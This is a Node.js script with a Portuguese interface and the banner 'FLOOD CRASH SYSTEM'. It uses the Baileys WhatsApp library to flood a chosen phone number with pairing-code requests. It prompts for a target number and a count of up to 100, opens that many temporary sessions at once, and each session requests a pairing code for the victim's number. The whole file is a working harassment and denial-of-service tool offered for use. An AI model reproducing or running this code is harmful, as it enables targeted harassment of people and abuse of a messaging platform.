const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    Browsers,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys')
const fs = require('fs')
const readline = require('readline')
const pino = require('pino')
const { Worker } = require('worker_threads')
const path = require('path')

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
})

function question(query) {
    return new Promise(resolve => rl.question(query, resolve))
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    dim: '\x1b[2m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    bgRed: '\x1b[41m',
    bgGreen: '\x1b[42m',
    bgYellow: '\x1b[43m',
    bgBlue: '\x1b[44m',
    bgMagenta: '\x1b[45m',
    bgCyan: '\x1b[46m'
}

function printBanner() {
    console.clear()
    console.log(colors.bright + colors.cyan + '╔════════════════════════════════════════════════════════════╗' + colors.reset)
    console.log(colors.bright + colors.cyan + '║' + colors.bright + colors.magenta + '                    🌊 FLOOD CRASH SYSTEM 🌊                    ' + colors.cyan + '║' + colors.reset)
    console.log(colors.bright + colors.cyan + '║' + colors.bright + colors.red + '                  MÚLTIPLAS CONEXÕES ATIVAS                  ' + colors.cyan + '║' + colors.reset)
    console.log(colors.bright + colors.cyan + '╚════════════════════════════════════════════════════════════╝' + colors.reset)
    console.log('')
}

async function showPanel() {
    printBanner()
    
    console.log(colors.bright + colors.yellow + '┌────────────────────────────────────────────────────────┐' + colors.reset)
    console.log(colors.bright + colors.yellow + '│                    📱 CONFIGURAÇÃO                     │' + colors.reset)
    console.log(colors.bright + colors.yellow + '└────────────────────────────────────────────────────────┘' + colors.reset)
    console.log('')
    
    const targetNumber = await question(colors.bright + colors.green + '📞 NÚMERO ALVO (ex: 5511999999999): ' + colors.reset)
    let cleanNumber = targetNumber.replace(/\D/g, '')
    
    if (!cleanNumber.startsWith('55')) {
        cleanNumber = '55' + cleanNumber
    }
    
    if (cleanNumber.length < 12 || cleanNumber.length > 13) {
        console.log(colors.bright + colors.red + '\n❌ NÚMERO INVÁLIDO! Use formato: 5511999999999' + colors.reset)
        await delay(2000)
        return showPanel()
    }
    
    console.log('')
    const quantity = await question(colors.bright + colors.green + '🔢 QUANTIDADE DE CÓDIGOS (1-100): ' + colors.reset)
    const numQuantity = parseInt(quantity)
    
    if (isNaN(numQuantity) || numQuantity < 1 || numQuantity > 100) {
        console.log(colors.bright + colors.red + '\n❌ QUANTIDADE INVÁLIDA! Use números entre 1 e 100' + colors.reset)
        await delay(2000)
        return showPanel()
    }
    
    console.log('')
    console.log(colors.bright + colors.yellow + '┌────────────────────────────────────────────────────────┐' + colors.reset)
    console.log(colors.bright + colors.yellow + '│                    🚀 EXECUTANDO                      │' + colors.reset)
    console.log(colors.bright + colors.yellow + '└────────────────────────────────────────────────────────┘' + colors.reset)
    console.log('')
    console.log(colors.bright + colors.cyan + `🎯 ALVO: ${cleanNumber}` + colors.reset)
    console.log(colors.bright + colors.cyan + `🔢 TOTAL: ${numQuantity} CÓDIGOS` + colors.reset)
    console.log(colors.bright + colors.cyan + `🔄 STATUS: INICIANDO CONEXÕES...` + colors.reset)
    console.log('')
    
    await executeFlood(cleanNumber, numQuantity)
}

async function requestCodeFromWorker(number, id) {
    return new Promise(async (resolve) => {
        const authFolder = './temp_auth_' + Date.now() + '_' + id + '_' + Math.random()
        
        try {
            const { state, saveCreds } = await useMultiFileAuthState(authFolder)
            const { version } = await fetchLatestBaileysVersion()
            
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                browser: Browsers.ubuntu('Chrome'),
                version: version,
                syncFullHistory: false,
                markOnlineOnConnect: false,
                connectTimeoutMs: 30000,
                defaultQueryTimeoutMs: 30000,
                keepAliveIntervalMs: 30000,
                logger: pino({ level: 'silent' })
            })
            
            sock.ev.on('creds.update', async () => {
                await saveCreds()
            })
            
            const timeout = setTimeout(() => {
                try { sock.end(undefined) } catch(e) {}
                setTimeout(() => {
                    try { fs.rmSync(authFolder, { recursive: true, force: true }) } catch(e) {}
                }, 1000)
                resolve({ id, success: false, error: 'Timeout (20s)' })
            }, 20000)
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update
                
                if (connection === 'open') {
                    clearTimeout(timeout)
                    try {
                        const code = await sock.requestPairingCode(number)
                        sock.end(undefined)
                        setTimeout(() => {
                            try { fs.rmSync(authFolder, { recursive: true, force: true }) } catch(e) {}
                        }, 1000)
                        resolve({ id, success: true, code: code })
                    } catch(err) {
                        clearTimeout(timeout)
                        sock.end(undefined)
                        setTimeout(() => {
                            try { fs.rmSync(authFolder, { recursive: true, force: true }) } catch(e) {}
                        }, 1000)
                        resolve({ id, success: false, error: err.message })
                    }
                }
                
                if (connection === 'close') {
                    clearTimeout(timeout)
                    const statusCode = lastDisconnect?.error?.output?.statusCode
                    if (statusCode !== DisconnectReason.loggedOut) {
                        resolve({ id, success: false, error: 'Connection closed' })
                    }
                }
            })
            
        } catch(err) {
            setTimeout(() => {
                try { fs.rmSync(authFolder, { recursive: true, force: true }) } catch(e) {}
            }, 1000)
            resolve({ id, success: false, error: err.message })
        }
    })
}

async function executeFlood(number, quantity) {
    const results = []
    const promises = []
    
    console.log(colors.bright + colors.magenta + '╔════════════════════════════════════════════════════════════╗' + colors.reset)
    console.log(colors.bright + colors.magenta + '║              🔥 CRIANDO MÚLTIPLAS CONEXÕES 🔥              ║' + colors.reset)
    console.log(colors.bright + colors.magenta + '╚════════════════════════════════════════════════════════════╝' + colors.reset)
    console.log('')
    
    // Criar todas as promessas simultaneamente
    for (let i = 0; i < quantity; i++) {
        console.log(colors.bright + colors.yellow + `📡 CONEXÃO ${i+1}/${quantity} - INICIANDO...` + colors.reset)
        const promise = requestCodeFromWorker(number, i+1)
        promises.push(promise)
        await delay(100) // Delay pequeno entre conexões
    }
    
    console.log('')
    console.log(colors.bright + colors.cyan + '⏳ AGUARDANDO RESPOSTAS...' + colors.reset)
    console.log('')
    
    // Aguardar todas as conexões terminarem
    const allResults = await Promise.all(promises)
    results.push(...allResults)
    
    await showResults(results, number, quantity)
}

async function showResults(results, number, quantity) {
    console.log('')
    console.log(colors.bright + colors.green + '╔════════════════════════════════════════════════════════════╗' + colors.reset)
    console.log(colors.bright + colors.green + '║                    ✅ RESULTADOS FINAIS                   ║' + colors.reset)
    console.log(colors.bright + colors.green + '╚════════════════════════════════════════════════════════════╝' + colors.reset)
    console.log('')
    console.log(colors.bright + colors.cyan + `🎯 NÚMERO ALVO: ${number}` + colors.reset)
    console.log(colors.bright + colors.cyan + `🔢 TOTAL SOLICITADO: ${quantity} CÓDIGOS` + colors.reset)
    
    const successCount = results.filter(r => r.success).length
    const failCount = results.filter(r => !r.success).length
    
    console.log('')
    console.log(colors.bright + colors.green + `✅ SUCESSOS: ${successCount}` + colors.reset)
    console.log(colors.bright + colors.red + `❌ FALHAS: ${failCount}` + colors.reset)
    console.log('')
    
    console.log(colors.bright + colors.yellow + '┌────────────────────────────────────────────────────────┐' + colors.reset)
    console.log(colors.bright + colors.yellow + '│                    📋 CÓDIGOS GERADOS                    │' + colors.reset)
    console.log(colors.bright + colors.yellow + '└────────────────────────────────────────────────────────┘' + colors.reset)
    console.log('')
    
    // Mostrar apenas códigos bem sucedidos
    const successResults = results.filter(r => r.success)
    if (successResults.length > 0) {
        for (const result of successResults) {
            console.log(colors.bright + colors.green + `✅ CONEXÃO ${result.id}: ${result.code}` + colors.reset)
        }
    }
    
    // Mostrar erros se houver
    const errorResults = results.filter(r => !r.success)
    if (errorResults.length > 0) {
        console.log('')
        console.log(colors.bright + colors.red + '┌────────────────────────────────────────────────────────┐' + colors.reset)
        console.log(colors.bright + colors.red + '│                    ❌ ERROS OCORRIDOS                    │' + colors.reset)
        console.log(colors.bright + colors.red + '└────────────────────────────────────────────────────────┘' + colors.reset)
        console.log('')
        for (const result of errorResults) {
            console.log(colors.bright + colors.red + `❌ CONEXÃO ${result.id}: ${result.error}` + colors.reset)
        }
    }
    
    console.log('')
    console.log(colors.bright + colors.magenta + '╔════════════════════════════════════════════════════════════╗' + colors.reset)
    console.log(colors.bright + colors.magenta + '║                    📊 ESTATÍSTICAS                      ║' + colors.reset)
    console.log(colors.bright + colors.magenta + '╚════════════════════════════════════════════════════════════╝' + colors.reset)
    console.log('')
    console.log(colors.bright + colors.cyan + `📈 TAXA DE SUCESSO: ${((successCount/quantity)*100).toFixed(1)}%` + colors.reset)
    console.log(colors.bright + colors.cyan + `💥 TOTAL DE CONEXÕES: ${quantity}` + colors.reset)
    console.log(colors.bright + colors.cyan + `🔑 TOTAL DE CÓDIGOS GERADOS: ${successCount}` + colors.reset)
    
    console.log('')
    console.log(colors.bright + colors.yellow + '┌────────────────────────────────────────────────────────┐' + colors.reset)
    console.log(colors.bright + colors.yellow + '│                      🔄 OPÇÕES                        │' + colors.reset)
    console.log(colors.bright + colors.yellow + '└────────────────────────────────────────────────────────┘' + colors.reset)
    console.log('')
    console.log(colors.bright + colors.green + '1. 🔁 EXECUTAR NOVAMENTE' + colors.reset)
    console.log(colors.bright + colors.red + '2. ❌ SAIR' + colors.reset)
    console.log('')
    
    const option = await question(colors.bright + colors.blue + '👉 ESCOLHA UMA OPÇÃO: ' + colors.reset)
    
    if (option === '1') {
        await showPanel()
    } else {
        console.log(colors.bright + colors.red + '\n👋 ENCERRANDO SISTEMA...' + colors.reset)
        process.exit(0)
    }
}

async function main() {
    await showPanel()
}

process.on('uncaughtException', (err) => {
    console.log(colors.bright + colors.red + '\n❌ ERRO: ' + err.message + colors.reset)
})

process.on('SIGINT', () => {
    console.log(colors.bright + colors.red + '\n\n👋 ENCERRANDO...' + colors.reset)
    process.exit(0)
})

main()
